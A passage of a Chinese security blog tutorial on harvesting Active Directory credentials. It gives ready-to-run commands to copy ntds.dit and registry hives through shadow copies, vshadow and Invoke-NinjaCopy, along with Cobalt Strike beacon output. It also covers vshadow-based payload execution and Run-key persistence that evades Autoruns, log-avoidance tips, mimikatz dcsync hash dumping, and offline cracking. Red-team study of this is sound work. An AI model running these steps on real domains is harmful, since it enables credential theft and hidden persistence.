+<h3 id="复制ntds-dit"><a href="#复制ntds-dit" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202008271744_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds2.dit</span><br><span class="line">copy C:\$SNAP_202008271744_VOLUMEC$\windows\system32\config\SYSTEM c:\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<h3 id="卸载快照"><a href="#卸载快照" class="headerlink" title="卸载快照"></a>卸载快照</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除快照"><a href="#删除快照" class="headerlink" title="删除快照"></a>删除快照</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<h1 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754968(v=ws.11)">https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754968(v=ws.11)</a></p>
+</blockquote>
+<p>vssadmin：卷影复制服务管理命令行工具</p>
+<p>域环境默认安装</p>
+<p>支持系统：</p>
+<ul>
+<li>Windows Server 2003</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2012</li>
+</ul>
+<h2 id="查询当前系统的快照-1"><a href="#查询当前系统的快照-1" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建快照-1"><a href="#创建快照-1" class="headerlink" title="创建快照"></a>创建快照</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
+
+<p>获得Shadow Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</p>
+<h2 id="访问快照中的文件"><a href="#访问快照中的文件" class="headerlink" title="访问快照中的文件"></a>访问快照中的文件</h2><p>查看快照列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
+
+<p>无法直接访问 ?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12 中的文件</p>
+<p>可通过创建符号链接访问快照中的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></pre></td></tr></table></figure>
+
+<p>删除符号链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rd c:\testvsc</span><br></pre></td></tr></table></figure>
+
+<p>如下图：</p>
+<h2 id="复制ntds-dit-1"><a href="#复制ntds-dit-1" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds3.dit</span><br></pre></td></tr></table></figure>
+
+<h2 id="删除快照-1"><a href="#删除快照-1" class="headerlink" title="删除快照"></a>删除快照</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
+
+<h1 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/vss/vshadow-tool-and-sample">https://docs.microsoft.com/zh-cn/windows/win32/vss/vshadow-tool-and-sample</a></p>
+</blockquote>
+<p>Vshadow ( vshadow.exe )： 是用于管理卷影副本的命令行实用程序。此工具包含在 MicrosoftWindows Software Development Kit (SDK) 中，有 Microsoft 签名。</p>
+<p>Vshadow 有很多功能，包括执行脚本和调用命令以支持卷影快照管理的能力。</p>
+<h2 id="查询当前系统的快照-2"><a href="#查询当前系统的快照-2" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="创建快照-2"><a href="#创建快照-2" class="headerlink" title="创建快照"></a>创建快照</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br><span class="line">参数说明：</span><br><span class="line">-p persistent，备份操作，重启系统不会删除</span><br><span class="line">-nw no writers，用来提高创建速度</span><br><span class="line">C: 对应c盘</span><br></pre></td></tr></table></figure>
+
+<p>获得 SnapshotSetID、SnapshotID、Shadow copy device name</p>
+<h2 id="复制ntds-dit-2"><a href="#复制ntds-dit-2" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy [Shadow copy device name]\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="删除快照-2"><a href="#删除快照-2" class="headerlink" title="删除快照"></a>删除快照</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vshadow -dx=&#123;ShadowCopySetId&#125;</span><br><span class="line">vshadow -ds=&#123;ShadowCopyId&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用vshadow执行命令"><a href="#利用vshadow执行命令" class="headerlink" title="利用vshadow执行命令"></a>利用vshadow执行命令</h2><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-forevasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-forevasion-persistence-and-active-directory-database-extraction/</a></p>
+</blockquote>
+<p>Vshadow.exe 支持 -exec 参数，可用于执行二进制文件（.exe）或脚本（.bat&#x2F;.cmd）。<br>-exec 参数不支持命令参数</p>
+<p>要求：</p>
+<ul>
+<li>管理员权限</li>
+<li>上传Vshadow.exe</li>
+<li>上传攻击载荷</li>
+</ul>
+<p>执行命令格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -nw -exec=&lt;\path\to\exe&gt; &lt;系统驱动器&gt;</span><br></pre></td></tr></table></figure>
+
+<p>-nw：允许我们在不调用卷影副本编写器的情况下创建卷影副本，实际上，这是一个非持久性卷影副本，不会留下“物理”磁盘证据</p>
+<p>执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br><span class="line">[*] Tasked beacon to run: vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br><span class="line">[+] host called home, sent: 87 bytes</span><br></pre></td></tr></table></figure>
+
+<p>成功执行 Vshadow 将启动卷影服务 (VSS)，如系统事件 ID 7036 所示，并调用 VSSVC.exe 进程。</p>
+<p>执行后，后台存在进程 VSSVC.exe，同时显示服务 Volume Shadow Copy 正在运行，需要手动关闭进程 VSSVC.exe</p>
+<p>注：手动关闭进程 VSSVC.exe 会生成日志 7034</p>
+<h2 id="自启动持久化和规避"><a href="#自启动持久化和规避" class="headerlink" title="自启动持久化和规避"></a>自启动持久化和规避</h2><p>利用思路：<br>vshadow.exe 包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns 的默认启动列表不显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ</span><br><span class="line">/d &quot;C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\vshadow.exe -nw - exec=</span><br><span class="line">c:\windows\system32\notepad.exe c:&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在 AutoRuns 中，当过滤 Microsoft Entries 时，我们将看不到我们的登录条目</p>
+<p>但是，如果我们取消选择 Microsoft Entries 并启用 Windows Entries，我们将看到我们的持久性机制的记录</p>
+<h1 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=451">https://adsecurity.org/?p=451</a></p>
+</blockquote>
+<p>使用 PowerShell 复制 NTDS.dit &#x2F; Registry Hives，绕过 SACL&#x2F; DACL &#x2F; File Locks</p>
+<blockquote>
+<p>下载地址：<br><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/InvokeNinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/InvokeNinjaCopy.ps1</a></p>
+</blockquote>
+<p>用于获取哈希的技术要么依赖于将代码注入 LSASS，要么使用卷影复制服务来获取包含哈希的文件的副本。</p>
+<p>Invoke-NinjaCopy，一个 PowerShell 脚本，能够通过获取卷的读取句柄并解析 NTFS 来复制NTDS.dit、注册表配置单元和位于 NTFS 卷上的任何其他文件。这不需要提升到 SYSTEM、注入到SYSTEM 进程或启动新服务&#x2F;可疑程序</p>
+<p>原理简述：获取 C 卷的读取句柄（管理员帐户可以执行此操作），能够读取整个卷的原始字节。然后，解析 C 卷上的 NTFS 结构，确定特定文件的字节在卷上的位置，扫描到该位置并复制文件字节。</p>
+<p>C++ 编写的 NTFS 解析器：<a target="_blank" rel="noopener" href="http://www.codeproject.com/Articles/81456/An-NTFS-ParserLib">http://www.codeproject.com/Articles/81456/An-NTFS-ParserLib</a></p>
+<p>将现有的 NTFS 解析器编译为 DLL 并将其加载到 Invoke-ReflectivePEInjection</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1</span><br><span class="line">[*] Tasked beacon to import: C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1</span><br><span class="line">[+] host called home, sent: 206740 bytes</span><br><span class="line">beacon&gt; powershell Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestinati</span><br><span class="line">on c:\sam.hive</span><br><span class="line">[*] Tasked beacon to run: Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDe</span><br><span class="line">stination c:\sam.hive</span><br><span class="line">[+] host called home, sent: 493 bytes</span><br><span class="line">beacon&gt; powershell Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestin</span><br><span class="line">ation c:\system.hive</span><br><span class="line">[*] Tasked beacon to run: Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -Loca</span><br><span class="line">lDestination c:\system.hive</span><br><span class="line">[+] host called home, sent: 509 bytes</span><br><span class="line">beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination</span><br><span class="line"> C:\ntds.dit</span><br><span class="line">[*] Tasked beacon to run: Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestin</span><br><span class="line">ation C:\ntds.dit</span><br><span class="line">[+] host called home, sent: 481 bytes</span><br></pre></td></tr></table></figure>
+
+<p>没有调用 Volume Shadow Copy 服务，因此不会产生日志</p>
+<h1 id="解密NTDS-DIT文件"><a href="#解密NTDS-DIT文件" class="headerlink" title="解密NTDS.DIT文件"></a>解密NTDS.DIT文件</h1><h2 id="Mimikatz在线破解"><a href="#Mimikatz在线破解" class="headerlink" title="Mimikatz在线破解"></a>Mimikatz在线破解</h2><p>在线破解，不用将域控上的ntds.dit文件下载下来，直接在已有的shell上破解。</p>
+<p>有一个Cobaltstrike弹回的beacon，就可以在beacon中直接利用mimikatz来破解，前提是要有管理员权限</p>
+<p>有一个 Meterpreter Shell ，可以在Session会话中加载kiwi模块，直接在目标主机进行密码凭证获取</p>
+<p>Mimikatz有一个功能dcsync，它可以利用目录复制服务（Directory Replication Service,DRS）从NTDS.DIT文件中提取密码哈希值。</p>
+<ul>
+<li>DCSync工作原理</li>
+</ul>
+<ol>
+<li>攻击者获得管理员及以上权限后，可以使用Mimikatz等工具模拟Active Directory域控制器</li>
+<li>然后攻击者使用DCSync命令，在目标域控制器上请求某个指定帐户的NTLM存储凭证密码哈希值，而无需提供该帐户的明文密码。但是攻击者需要知道目标帐户的名称，以及目标系统的域名和管理员凭据。</li>
+<li>目标域控制器接收到此请求后，将密码哈希值返回给攻击者。</li>
+<li>攻击者可以使用获得的密码哈希值来执行其他攻击，例如Pass-the-Hash攻击，这种攻击技术允许攻击者使用哈希值进行身份验证并获取对系统的访问权限，而无需知道实际的明文密码。此外，攻击者也可以尝试破解密码哈希值以获得明文密码。</li>
+</ol>
+<ul>
+<li>获取 mingy 域内所有用户 Hash</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mingy.com /all /csv</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看单个用户的详细信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看所有用户的详细信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::lsa /inject</span><br></pre></td></tr></table></figure>
+
+<h2 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h2><p>离线破解一般需要两步，首先就是将远端域控的ntds.dit下载到本地，然后再在本地进行破解。</p>
+<p>ntds.dit文件一直在被windows系统使用，所以常规的复制下载方法是无法将文件下载到本地的。</p>
+<p>首先将域控的 NTDS.DIT 和 SYSTEM 文件下载到本地，然后在本地进行破解。</p>
+<ul>
+<li>SecretsDump</li>
+</ul>
+<p>通过 <code>impacket</code> 套件中的 <code>secretsdump.py</code> 脚本获取 <code>Hash</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># sam</span><br><span class="line">secretsdump.exe -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br><span class="line"></span><br><span class="line"># ntds.dit</span><br><span class="line">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br><span class="line"></span><br><span class="line"># kali中可以使用impacket-secretsdump命令</span><br><span class="line">impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p>解密Hash得到明文密码，复制administrator账号的 NTLM Hash 写入文件 1 中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">161cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure>
+
+<p>使用 John the ripper 进行 NTLM Hash 破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1 --format=NT</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DSInternals</li>
+</ul>
+<p>DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p>
+</blockquote>
+<p>支持系统：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2008 R2</span><br><span class="line">Windows 10 64-bit</span><br><span class="line">Windows 8.1 64-bit</span><br><span class="line">Windows 7 64-bit</span><br></pre></td></tr></table></figure>
+
+<p>要使用 DSInternals 模块提取用户哈希值，我们需要先获取 ntds.dit、SYSTEM 这两个文件。将ntds.dit、SYSTEM 这两个文件导出并拖到我们本地后，即可执行如下命令获取所有账户哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 导入DSInternals模块</span><br><span class="line">Import-Module DSInternals</span><br><span class="line"></span><br><span class="line"># 获取System bootkey</span><br><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\SYSTEM&#x27;</span><br><span class="line"></span><br><span class="line"># 获取所有账户信息</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\ntds.dit&#x27; -Bootkey $key</span><br></pre></td></tr></table></figure>
+
+<p>还可以导出支持 Hashcat 格式的哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\SYSTEM&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\ntds.dit&#x27; -BootKey $key | Format-Custom -View HashcatNT| Out-File hashes.txt</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/14d8.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/14d8.html')">域环境密码凭证获取</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/14d8.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=域环境密码凭证获取&amp;url=https://hihopkc.github.io/posts/14d8.html&amp;pic=/img/default_cover.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/8784.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202310251051891.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023年“羊城杯”网络安全大赛WP</div></div></a></div><div class="next-post pull-right"><a href="/posts/2900.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Socks代理简介</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E5%9F%9F%E8%AE%A4%E8%AF%81"><span class="toc-number">1.</span> <span class="toc-text">Windows域认证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">活动目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">Kerberos协议简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.3.</span> <span class="toc-text">Kerberos认证协议基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerbreros%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">Kerbreros认证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">用户登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">1.6.</span> <span class="toc-text">请求身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%90%91AS-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%9C%8D%E5%8A%A1-%E5%8F%91%E9%80%81%E8%AE%A4%E8%AF%81%E8%AF%B7%E6%B1%82"><span class="toc-number">1.6.1.</span> <span class="toc-text">客户端向AS(身份认证服务)发送认证请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS%E7%A1%AE%E8%AE%A4Client%E7%AB%AF%E7%99%BB%E5%BD%95%E8%80%85%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD"><span class="toc-number">1.6.2.</span> <span class="toc-text">AS确认Client端登录者用户身份</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E6%8E%88%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">请求服务授权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%90%91TGS%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E6%8E%88%E6%9D%83%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.1.</span> <span class="toc-text">客户端向TGS发送请求服务授权请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 